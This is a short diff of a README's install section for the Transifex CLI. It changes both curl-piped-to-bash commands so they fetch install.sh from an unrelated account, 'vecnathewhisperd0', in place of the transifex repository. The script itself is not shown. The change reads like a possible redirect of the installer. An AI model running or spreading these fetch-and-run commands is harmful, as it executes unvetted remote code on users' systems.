@@ -6,13 +6,13 @@
 You can install the latest Transifex CLI by executing:
 
 ```
-curl -o- https://raw.githubusercontent.com/transifex/cli/master/install.sh | bash
+curl -o- https://raw.githubusercontent.com/vecnathewhisperd0/cli/master/install.sh | bash
 ```
 
 Or you can isntall a specific version if you need by executing:
 
 ```
-curl -o- https://raw.githubusercontent.com/transifex/cli/master/install.sh | bash -s -- yourVersion
+curl -o- https://raw.githubusercontent.com/vecnathewhisperd0/cli/master/install.sh | bash -s -- yourVersion
 ```
 
 
